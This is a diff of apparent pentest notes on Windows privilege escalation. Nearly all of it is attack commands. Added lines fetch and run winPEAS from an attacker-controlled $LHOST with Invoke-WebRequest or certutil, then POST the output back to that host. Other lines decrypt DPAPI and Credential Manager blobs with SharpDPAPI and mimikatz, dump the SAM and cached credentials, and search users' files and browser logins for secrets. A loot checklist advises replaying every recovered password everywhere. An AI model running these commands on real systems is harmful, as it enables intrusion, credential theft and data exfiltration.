@@ -1,9 +1,38 @@
-# Windows Privilege Escalation
+## winPEAS collection and parsing
 
-## PEASS collection and parsing
-```text
-Use [[Shell Delivery and Transfer]].
+Primary workflow:
+- download `winPEASx64.exe`
+- run it to a log file
+- upload the raw output back to Kali
+- parse it there if needed
+
+Download and run:
+```powershell
+$exe = Join-Path $wd 'winPEASx64.exe'
+$out = Join-Path $wd 'winpeas.out'
+Invoke-WebRequest -UseBasicParsing -Uri "http://$LHOST/winPEASx64.exe" -OutFile $exe
+& $exe log=$out
+Invoke-WebRequest -UseBasicParsing -Method POST -InFile $out -Uri "http://$LHOST/upload?name=winpeas.out"
 ```
+
+Fallback download:
+```cmd
+mkdir C:\Windows\Temp\working
+certutil -urlcache -split -f http://%LHOST%/winPEASx64.exe C:\Windows\Temp\working\winPEASx64.exe
+C:\Windows\Temp\working\winPEASx64.exe log=C:\Windows\Temp\working\winpeas.out
+```
+
+If SMB staging already works:
+```cmd
+net use Z: \\%LHOST%\share /user:user pass
+mkdir C:\Windows\Temp\working
+copy Z:\uploads\winPEASx64.exe C:\Windows\Temp\working\winPEASx64.exe
+C:\Windows\Temp\working\winPEASx64.exe log=C:\Windows\Temp\working\winpeas.out
+```
+
+Parsers:
+- `ParsingPeas`: https://github.com/YuvalMil/ParsingPeas
+- `parsePEASS`: https://github.com/mnemonic-re/parsePEASS
 
 ## Run PrivescCheck
 ```powershell
@@ -27,35 +56,6 @@ route print
 netstat -ano
 ```
 
-## List installed software
-```powershell
-Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
-Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
-```
-
-## List processes with command lines
-```powershell
-Get-CimInstance Win32_Process | Select-Object ProcessId,Name,CommandLine
-```
-
-## Search for useful files
-```powershell
-Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.cfg,*.xml,*.kdbx,*.exe,*.zip -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\ -Include *.db,*.sqlite,*.sql -Recurse -ErrorAction SilentlyContinue
-```
-
-## Loot triage checklist
-```text
-Pull and review first:
-- .env, web.config, unattend, sysprep, export, backup, zip, bak
-- scripts, scheduled task actions, service configs, installer leftovers
-- Jenkins home, job workspaces, build history, users, secrets
-- browser data, PSReadLine, cmdkey, Credential Manager, DPAPI blobs
-- database files, connection strings, saved RDP files
-
-Every recovered password or hash gets replayed everywhere before you go hunting for a new bug.
-```
-
 ## Find PSReadLine history
 ```powershell
 Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
@@ -71,8 +71,44 @@ cmdkey /list
 ```powershell
 Get-ChildItem -Path C:\Users\*\AppData\Local\Microsoft\Credentials -Force -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Credentials -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\*\AppData\Local\Microsoft\Protect -Force -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Protect -Force -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login* -Force -ErrorAction SilentlyContinue
+```
+
+## Decrypt Credential Manager secrets
+User-scope blobs:
+```cmd
+SharpDPAPI.exe credentials /unprotect
+```
+
+Machine-scope blobs with `CRYPTPROTECT_SYSTEM`:
+```cmd
+SharpDPAPI.exe machinecredentials
+```
+
+Only if the automated path fails and the blob is still worth forcing:
+```cmd
+.\mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<blob>" "exit"
+```
+
+## List installed software
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
+```
+
+## List processes
+```powershell
+Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine
+```
+
+`--Filter "ProcessId = 1234"`
+
+## Search for useful files
+```powershell
+Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.cfg,*.xml,*.kdbx,*.exe,*.zip -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.db,*.sqlite,*.sql -Recurse -ErrorAction SilentlyContinue
 ```
 
 ## Check VNC creds in registry
@@ -90,18 +126,6 @@ reg query HKLM\SOFTWARE\TightVNC\Server
 ```cmd
 .\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"
 .\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
-```
-
-## Triage DPAPI credential blobs
-```cmd
-.\mimikatz.exe "dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<blob>" "exit"
-.\mimikatz.exe "sekurlsa::dpapi" "exit"
-```
-
-## Dump browser and Credential Manager secrets with SharpDPAPI
-```cmd
-SharpDPAPI.exe credentials /unprotect
-SharpDPAPI.exe browser /unprotect
 ```
 
 ## List services with paths
@@ -201,34 +225,25 @@ Get-ChildItem -Path C:\ProgramData\Jenkins -Recurse -ErrorAction SilentlyContinu
 ```
 
 ## Jenkins files worth pulling
-```text
-- users\*\config.xml
-- credentials.xml
-- secrets\
-- jobs\*\config.xml
-- jobs\*\builds\
-- workspace\
-- nodes\
-```
-
-## Shell delivery and file transfer
-```text
-Use [[Shell Delivery and Transfer]].
-```
+- `users\*\config.xml`
+- `credentials.xml`
+- `secrets\`
+- `jobs\*\config.xml`
+- `jobs\*\builds\`
+- `workspace\`
+- `nodes\`
 
 ## Post-exploitation after admin or SYSTEM
-```text
 Do this before pivoting:
-- read Mimikatz output fully
-- read all PSReadLine history
-- search for unusual files, db files, configs, saved creds
+- read Mimikatz output
+- read all `PSReadLine` history
+- search for unusual files, DB files, configs, saved creds
 - crack archives and inspect the contents, not just the filenames
 - if a service is localhost-only, expose it now
-- pull Credential Manager / DPAPI artifacts while you still have context
-- check ipconfig /all, netstat -ano, arp -a
+- pull Credential Manager / `DPAPI` artifacts while you still have context
+- check `ipconfig /all`, `netstat -ano`, `arp -a`
 - if domain joined, rerun AD enumeration from this host
 - test every found password/hash everywhere
-```
 
 ## Resources
 - Priv2Admin: https://github.com/gtworek/Priv2Admin
